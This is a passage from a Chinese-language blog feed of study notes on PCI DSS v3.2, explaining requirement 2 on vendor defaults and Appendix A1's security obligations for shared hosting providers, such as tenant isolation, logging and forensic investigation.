确保已记录、正在使用且所有相关方了解用于管理供应商默认设置及其他安全参数的安全政策和操作程序</h3><p><img src="https://upload-images.jianshu.io/upload_images/6269327-4c1107760e1624cb.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="2.5"><br>对那些使用了供应商默认设置以及其他安全参数的安全政策的操作都有记录。且实时更新。比如我们一个邮件服务，我们哪些使用了供应商默认的，要有确认检测并记录，为了达到安全标准我们做了哪些安全参数的调整，这些也要记录。</p><h3 id="2-6-共享托管服务商必须保护每个实体的托管环境和持卡人数据。"><a href="#2-6-共享托管服务商必须保护每个实体的托管环境和持卡人数据。" class="headerlink" title="2.6 共享托管服务商必须保护每个实体的托管环境和持卡人数据。"></a>2.6 共享托管服务商必须保护每个实体的托管环境和持卡人数据。</h3><p>这些提供商必须符合附录A1中详述的具体要求：《针对供应商托管服务提供商的PCI DSS附加要求》中详述的具体要求。<br><img src="https://upload-images.jianshu.io/upload_images/6269327-91ea7e610e9e6644.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="2.6"><br>这是针对服务器，托管环境提供商对客户服务器的保护的要求。主要在附录A1中，虽然不是针对公司的，但是我们也得知道服务商能为我们做到什么样的抱回。我们具体看看这四个要求。</p><h2 id="附录A1：针对共享托管服务提供商的PCI-DSS附加要求"><a href="#附录A1：针对共享托管服务提供商的PCI-DSS附加要求" class="headerlink" title="附录A1：针对共享托管服务提供商的PCI DSS附加要求"></a>附录A1：针对共享托管服务提供商的PCI DSS附加要求</h2><p><img src="https://upload-images.jianshu.io/upload_images/6269327-3a32422ef5e84141.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="A1"><br>托管服务提供商必须保护每个实体的托管环境和数据。举个例子，比如我们公司寻找一个数据中心托管服务商，需要考虑很多问题，除了网络上的保护，还有物理上的，比如我们会找一个不会发生地震这种天灾的，离公司近的托管服务商。PCI DSS特地对托管服务商也有很多要求，这是在确保公司内部做好之后，第三方的提供商也有足够的安全保护策略。这个也方便我们在寻找托管服务提供商的时候大概有一个标准，而不是听对方的盲目吹牛。</p><h3 id="A1-1-确保每个实体仅运行可访问自身持法人数据环境的流程"><a href="#A1-1-确保每个实体仅运行可访问自身持法人数据环境的流程" class="headerlink" title="A1.1 确保每个实体仅运行可访问自身持法人数据环境的流程"></a>A1.1 确保每个实体仅运行可访问自身持法人数据环境的流程</h3><p><img src="https://upload-images.jianshu.io/upload_images/6269327-1bfe54792edeb9c1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="A1.1"><br>就是共享托管服务提供商必须保证每个客户只能访问和运行自己的服务器，或者说数据环境。具体一点就是我每一个实体（商户，客户）都有自己特定的账户，而不是共享的一个。就是做好权限的划分，特定客户自己的只能操作和访问他自己的，对其他实体都没有权限。</p><h3 id="A1-2-每个实体的访问权限和特权仅限其自身的持卡人数据环境"><a href="#A1-2-每个实体的访问权限和特权仅限其自身的持卡人数据环境" class="headerlink" title="A1.2 每个实体的访问权限和特权仅限其自身的持卡人数据环境"></a>A1.2 每个实体的访问权限和特权仅限其自身的持卡人数据环境</h3><p><img src="https://upload-images.jianshu.io/upload_images/6269327-b062bdd5081e272e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="A1.2"><br>同样是权限的问题，每个实体都只有自己的文件和目录的权限，没有其他用户的文件或文件夹的任何权限，也没有对任何系统文件的任何权限。系统文件这些应该掌握在托管服务提供商手上。同时对服务器上不同的资源均已分配好和有限制，不会造成其他漏洞被利用。</p><h3 id="A1-3-确保日志记录和检查记录已启用、对于每个实体的持卡人数据环境唯一且符合PCI-DSS要求10"><a href="#A1-3-确保日志记录和检查记录已启用、对于每个实体的持卡人数据环境唯一且符合PCI-DSS要求10" class="headerlink" title="A1.3 确保日志记录和检查记录已启用、对于每个实体的持卡人数据环境唯一且符合PCI DSS要求10"></a>A1.3 确保日志记录和检查记录已启用、对于每个实体的持卡人数据环境唯一且符合PCI DSS要求10</h3><p><img src="https://upload-images.jianshu.io/upload_images/6269327-f9d05410317b2274.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="A1.3"><br>这里是保证托管服务提供商对指定客户有指定的日志记录，同时确保日志记录处于活动状态。且可供客户查看。这样客户自己就可以通过日志查看操作和登录等信息。</p><h3 id="A1-4-启用相关流程，确保在任何托管商户或服务器提供商受到威胁时提供及时的取证调查"><a href="#A1-4-启用相关流程，确保在任何托管商户或服务器提供商受到威胁时提供及时的取证调查" class="headerlink" title="A1.4 启用相关流程，确保在任何托管商户或服务器提供商受到威胁时提供及时的取证调查"></a>A1.4 启用相关流程，确保在任何托管商户或服务器提供商受到威胁时提供及时的取证调查</h3><p><img src="https://upload-images.jianshu.io/upload_images/6269327-1a23f9fb9b95dde7.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="A1.4"><br>这个就根据字面上就可以理解的。服务商得有相关书面政策，如果服务提供商出现问题，服务提供商是可以被取证调查的。如果我们的数据等在服务提供商那里出现问题，我们可以根据他们之前的书面政策，对服务商进行取证调查。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>要求2大概到这里就结束了。要求2：不要使用供应商提供的默认系统密码和其他安全参数<br>很重要的一点，虽然看起来只有一句话，但是细看下来里面的内容还是不少的。最后还是告诫相关从业者，不要图自己的方便，而使用了默认提供商提供的这些默认配置，他们并不用为你的安全负责，但你自己要！很多时候不得不使用，也得有一定的安全策略保证其符合PCI DSS的标准！<br>后面也看了看附录A中对托管服务提供商的一些要求，这些也为大家提供了意见，这个也是必须要了解的，起码能知道他们能为我们做到什么地步，更多的还是要看到他们做不到或者不能做的地方，我们自己需要去补充。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;hr&gt;
&lt;h1 id=&quot;PCI-DSS-V3-2-学习笔记-二&quot;&gt;&lt;a href=&quot;#PCI-DSS-V3-2-学习笔记-二&quot; class=&quot;headerlink&quot; title=&quot;PCI-DSS(V3.2)学习笔记(二)&quot;&gt;&lt;/a&gt;PCI-DSS(V3.2)学习笔记(二)&lt;/h
      
    
    </summary>
    
      <category term="安全知识" scheme="http://rliyuqing.github.io/categories/%E5%AE%89%E5%85%A8%E7%9F%A5%E8%AF%86/"/>
    
    
      <category term="安全知识" scheme="http://rliyuqing.github.io/tags/%E5%AE%89%E5%85%A8%E7%9F%A5%E8%AF%86/"/>
    
  </entry>
  
</feed>
